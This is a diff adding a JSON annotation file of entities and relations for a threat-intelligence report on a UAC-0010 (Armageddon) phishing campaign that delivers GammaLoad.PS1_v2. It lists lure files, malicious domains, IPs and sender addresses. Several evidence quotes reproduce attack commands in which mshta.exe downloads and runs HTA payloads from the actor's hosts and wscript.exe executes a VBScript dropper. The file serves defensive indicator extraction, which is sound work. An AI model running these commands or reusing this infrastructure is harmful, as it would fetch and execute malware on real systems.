@@ -1,0 +1,248 @@
+{
+  "entities": [
+    {
+      "name": "UAC-0010 (Armageddon)",
+      "kind": "threat actor",
+      "gloss": "A Russian state-sponsored cyber espionage group also tracked as Gamaredon or Armageddon targeting Ukrainian entities."
+    },
+    {
+      "name": "GammaLoad.PS1_v2",
+      "kind": "malware family",
+      "gloss": "A PowerShell-based malware family used by UAC-0010 to capture screenshots and deliver secondary payloads."
+    },
+    {
+      "name": "План Херсон.htm",
+      "kind": "malicious file",
+      "gloss": "A malicious HTML file distributed via phishing emails to decode and drop an archive on the victim machine."
+    },
+    {
+      "name": "Herson.rar",
+      "kind": "malicious archive",
+      "gloss": "A RAR archive file extracted from a malicious HTML attachment containing a malicious shortcut file."
+    },
+    {
+      "name": "План підходу та закладання вибухівки на об'єктах критичної інфростурктури Херсона.lnk",
+      "kind": "malicious shortcut",
+      "gloss": "A malicious Windows shortcut file designed to download and execute an HTA payload."
+    },
+    {
+      "name": "precarious.xml",
+      "kind": "malicious script",
+      "gloss": "An HTA XML file downloaded and executed to drop and run subsequent scripts."
+    },
+    {
+      "name": "rejection.xml",
+      "kind": "malicious script",
+      "gloss": "An HTA XML file used in the attack chain to execute malicious VBScript commands."
+    },
+    {
+      "name": "desktop.txt",
+      "kind": "malicious script",
+      "gloss": "A malicious VBScript payload disguised as a text file and executed using wscript.exe."
+    },
+    {
+      "name": "user.txt",
+      "kind": "malicious script",
+      "gloss": "A malicious script file dropped during execution to support payload staging."
+    },
+    {
+      "name": "get.php",
+      "kind": "malicious script",
+      "gloss": "A PHP endpoint on the command-and-control server serving GammaLoad.PS1_v2."
+    },
+    {
+      "name": "Витяг з наказу.htm",
+      "kind": "malicious file",
+      "gloss": "A malicious HTML file used as a phishing attachment in the campaign."
+    },
+    {
+      "name": "768_08.05.2022.rar",
+      "kind": "malicious archive",
+      "gloss": "A RAR archive containing a malicious shortcut masquerading as a military order."
+    },
+    {
+      "name": "Витяг з наказу Генерального штабу Збройних Сил України від 08.05.2022 №768.lnk",
+      "kind": "malicious shortcut",
+      "gloss": "A malicious shortcut file masquerading as a Ukrainian General Staff decree."
+    },
+    {
+      "name": "Генерального штабу Збройних Сил України",
+      "kind": "government body",
+      "gloss": "The central military management body of the Armed Forces of Ukraine."
+    },
+    {
+      "name": "України",
+      "kind": "country",
+      "gloss": "A country in Eastern Europe."
+    },
+    {
+      "name": "sendmail.website",
+      "kind": "domain name",
+      "gloss": "An internet domain used by threat actors to send malicious phishing emails."
+    },
+    {
+      "name": "a0671524.xsph.ru",
+      "kind": "domain name",
+      "gloss": "A domain name used as malicious infrastructure to host intermediate payloads."
+    },
+    {
+      "name": "a0667987.xsph.ru",
+      "kind": "domain name",
+      "gloss": "A domain name used to host malicious scripts and payloads in the attack chain."
+    },
+    {
+      "name": "qiwardos.ru",
+      "kind": "domain name",
+      "gloss": "A domain name used for malware delivery and command-and-control communication."
+    },
+    {
+      "name": "nitikora.ru",
+      "kind": "domain name",
+      "gloss": "A command-and-control domain associated with UAC-0010 infrastructure."
+    },
+    {
+      "name": "milotraf.ru",
+      "kind": "domain name",
+      "gloss": "A malicious internet domain used in the cyber espionage campaign."
+    },
+    {
+      "name": "nikotod.ru",
+      "kind": "domain name",
+      "gloss": "An internet domain utilized by the threat actor for command and control."
+    },
+    {
+      "name": "military-ukraine@sendmail.website",
+      "kind": "email address",
+      "gloss": "A spoofed email address used by attackers to distribute phishing lures."
+    },
+    {
+      "name": "coyote@sendmail.website",
+      "kind": "email address",
+      "gloss": "An email address used by the threat actor to send malicious emails."
+    },
+    {
+      "name": "194.58.121.198",
+      "kind": "ip address",
+      "gloss": "An IP address involved in the email relay or command-and-control infrastructure."
+    },
+    {
+      "name": "92.53.116.145",
+      "kind": "ip address",
+      "gloss": "An IP address observed in the infrastructure used during the phishing campaign."
+    },
+    {
+      "name": "216.128.131.233",
+      "kind": "ip address",
+      "gloss": "An IP address identified as part of the threat actor's network infrastructure."
+    },
+    {
+      "name": "66.42.95.123",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious command-and-control servers."
+    },
+    {
+      "name": "icanhazip.com",
+      "kind": "domain name",
+      "gloss": "A legitimate public IP lookup web service abused by malware to discover external IP addresses."
+    },
+    {
+      "name": "mshta.exe",
+      "kind": "software product",
+      "gloss": "A legitimate Windows utility that executes Microsoft HTML Applications (HTA)."
+    },
+    {
+      "name": "wscript.exe",
+      "kind": "software product",
+      "gloss": "A Windows command-line utility used to execute VBScript and JScript scripts."
+    },
+    {
+      "name": "cmd.exe",
+      "kind": "software product",
+      "gloss": "The default command-line interpreter on Microsoft Windows operating systems."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0010 (Armageddon)",
+      "type": "operates",
+      "tail": "GammaLoad.PS1_v2",
+      "evidence": "Активність здійснюється групою UAC-0010 (Armageddon)"
+    },
+    {
+      "head": "План Херсон.htm",
+      "type": "drops-file",
+      "tail": "Herson.rar",
+      "evidence": "HTM-файл забезпечить декодування і створення на комп'ютері жертви файлу \"Herson.rar\""
+    },
+    {
+      "head": "Herson.rar",
+      "type": "contains-file",
+      "tail": "План підходу та закладання вибухівки на об'єктах критичної інфростурктури Херсона.lnk",
+      "evidence": "\"Herson.rar\", який містить файл-ярлик \"План підходу та закладання вибухівки..."
+    },
+    {
+      "head": "План підходу та закладання вибухівки на об'єктах критичної інфростурктури Херсона.lnk",
+      "type": "downloads-and-executes",
+      "tail": "precarious.xml",
+      "evidence": "LNK-файл у разі його вікдриття забезпечить завантаження і запуск HTA-файлу \"precarious.xml\""
+    },
+    {
+      "head": "precarious.xml",
+      "type": "drops-file",
+      "tail": "desktop.txt",
+      "evidence": "запуск HTA-файлу \"precarious.xml\", що призведе до створення та виконання файлів \"desktop.txt\""
+    },
+    {
+      "head": "precarious.xml",
+      "type": "drops-file",
+      "tail": "user.txt",
+      "evidence": "запуск HTA-файлу \"precarious.xml\", що призведе до створення та виконання файлів \"desktop.txt\" і \"user.txt\""
+    },
+    {
+      "head": "desktop.txt",
+      "type": "downloads-and-executes",
+      "tail": "GammaLoad.PS1_v2",
+      "evidence": "В результаті, на комп'ютер буде завантажено шкідливу програму GammaLoad.PS1_v2"
+    },
+    {
+      "head": "mshta.exe",
+      "type": "executes-file",
+      "tail": "precarious.xml",
+      "evidence": "%WINDIR%\\System32\\mshta.exe http://a0671524.xsph.ru/bandage/precarious.xml /f"
+    },
+    {
+      "head": "mshta.exe",
+      "type": "executes-file",
+      "tail": "rejection.xml",
+      "evidence": "%WINDIR%\\System32\\mshta.exe http://a0667987.xsph.ru/preparations/rejection.xml /f"
+    },
+    {
+      "head": "wscript.exe",
+      "type": "executes-file",
+      "tail": "desktop.txt",
+      "evidence": "cmd.exe /c wscript.exe %USERPROFILE%\\desktop.txt //b //e:VBScript"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "operates",
+      "definition": "The threat actor deploys, manages, or uses the specified tool or malware family."
+    },
+    {
+      "name": "drops-file",
+      "definition": "A file or process creates or extracts another file on the host system."
+    },
+    {
+      "name": "contains-file",
+      "definition": "An archive or package file contains another specified file within it."
+    },
+    {
+      "name": "downloads-and-executes",
+      "definition": "A file or process fetches a remote payload and triggers its execution."
+    },
+    {
+      "name": "executes-file",
+      "definition": "A system program or process runs or interprets a specified file."
+    }
+  ]
+}
